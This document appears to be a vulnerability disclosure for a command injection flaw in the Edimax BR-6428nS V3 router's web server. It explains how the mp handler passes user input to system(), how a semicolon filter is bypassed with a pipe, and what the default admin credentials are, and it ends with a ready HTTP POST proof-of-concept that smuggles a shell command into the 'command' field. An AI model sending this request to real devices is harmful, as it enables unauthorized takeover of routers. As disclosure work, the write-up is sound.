## Firmware Download

you can download BR-6428nS V3 firmware from [here](https://www.edimax.com/edimax/download/download/data/edimax/global/download/wireless_routers_n300/br-6428ns_v3)

![firmware download](https://github.com/countfatcode/temp/blob/main/1.png)

## analyze

The ```mp``` function in ```/bin/webs``` can receive the command parameter and execute it using ```system``` function.

![vuln](./3.jpg)

Before using the system function to execute the command, ```strchr``` will replace the ';' in the command parameter with '\0', but we can use '|' to easily bypass the check.Below is a screenshot of the exploit.

![vuln1](https://github.com/countfatcode/temp/blob/main/2.jpg)

PS You must pass basic verification before you can exploit this vulnerability.The default user/passwd is admin/1234.

![vuln2](https://github.com/countfatcode/temp/blob/main/4.png)

## POC

```python
POST /goform/mp HTTP/1.1
Host: 192.168.2.1
Content-Length: 44
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.2.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.2.1/apppoe.asp
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

command=1 %7C touch %2Fhacker %7C echo hello
```

